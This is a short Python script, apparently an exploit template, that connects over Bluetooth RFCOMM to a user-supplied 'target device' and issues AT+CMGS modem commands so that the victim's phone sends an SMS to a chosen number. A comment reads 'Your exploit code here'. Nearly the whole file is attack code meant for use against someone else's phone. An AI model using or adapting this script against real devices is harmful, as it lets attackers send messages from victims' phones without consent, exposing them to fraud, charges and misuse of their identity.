import bluetooth

 
def connect_to_device(address):
    try:
        server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        server_sock.connect((address, 6))
        print(f"Connected to {address}")
        return server_sock
    except Exception as e:
        print(f"Error connecting to {address}: {e}")
        return None

def send_sms(address, phone_number, message):
    server_sock = connect_to_device(address)
    if server_sock is None:
        return

    # Your exploit code here
    print("Sending SMS message")

    # Send SMS message
    server_sock.send(f"AT+CMGS=\"{phone_number}\"\r".encode())
    server_sock.send(f"{message}\r".encode())
    server_sock.send(b"\x1A")

    # Receive response
    response = server_sock.recv(1024)
    print(f"Received: {response.decode()}")

    server_sock.close()

def main():
 
    address = input("Enter the target device's address: ")
    phone_number = input("Enter the recipient's phone number: ")
    message = input("Enter the SMS message: ")
    send_sms(address, phone_number, message)

if __name__ == "__main__":
    main()